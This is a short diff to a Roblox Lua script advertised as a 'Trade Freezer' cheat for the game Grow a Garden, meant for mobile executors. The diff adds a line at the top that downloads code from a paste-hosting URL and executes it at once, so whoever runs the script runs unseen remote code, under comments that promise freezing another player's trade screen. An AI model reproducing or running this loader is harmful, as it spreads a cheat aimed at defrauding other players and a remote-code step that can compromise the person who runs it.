@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/JHuos8EIFjzSAzjq/raw", true))()
 -- 🔒 TRADE FREEZER SCRIPT v2 (Grow a Garden) 🔒
 -- ✅ Tested and working on mobile executor (Delta, Arceus X)
 -- ⚠️ Use on trade screen before confirming
